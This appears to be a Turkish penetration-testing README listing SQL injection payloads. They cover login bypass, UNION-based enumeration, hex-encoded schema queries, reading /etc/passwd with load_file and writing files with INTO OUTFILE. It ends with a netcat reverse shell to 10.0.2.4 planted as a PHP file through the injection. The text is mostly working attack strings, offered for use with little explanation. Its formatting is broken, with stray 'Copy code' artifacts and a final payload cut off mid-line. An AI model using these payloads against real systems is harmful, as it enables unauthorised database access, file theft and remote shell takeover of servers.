# SqlBypass-Penetration

# SQL Injection ve Active Directory Penetration Testing Örnekleri

## Temel SQL Injection

### Örnek 1: Basit SQL Injection

```sql
SELECT * FROM accounts WHERE username=david AND password='1234' AND 1=1#
Örnek 2: Login Bypass
sql
Copy code
SELECT * FROM accounts WHERE username='david'# AND password='1234'
Örnek 3: OR Operatörü
sql
Copy code
SELECT * FROM accounts WHERE username='david' AND password='1234' OR 1=1#
Örnek 4: SQL Injection Get Method
html
Copy code
http://example.com/login?username=david' OR '1'='1&password=1234
UNION SELECT İşlemleri
Örnek 5: UNION SELECT Temel Kullanım
sql
Copy code
username='david' UNION SELECT 1,2,3,4,5#
Örnek 6: İleri Seviye SQL Injection
sql
Copy code
1' AND 1=1#
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,3--+
' UNION SELECT sum(columnname) from tablename--
HEX Verme
Örnek 7: HEX İle SQL Injection
sql
Copy code
david' union select 1,table_name from information_schema.tables where table_schema = 0x64767761#
DOSYA OKUMA VE YAZMA
Örnek 8: Dosya Okuma
sql
Copy code
1' union select 1,load_file('/etc/passwd')#
Örnek 9: Dosya Yazma
sql
Copy code
1' union select 1,'test',into outfile 'tmp/test.txt'#
SQL Açığı İle Shell Almak
Örnek 10: PHP Reverse Shell
php
Copy code
<?passthru("nc 10.0.2.4 4040 -e /bin/bash");?>
bash
Copy code
1' union select 1,'<?passthru("nc 10.0.2.4 4040 -e /bin/bash");?>',into outfile 'tmp/myshell.p
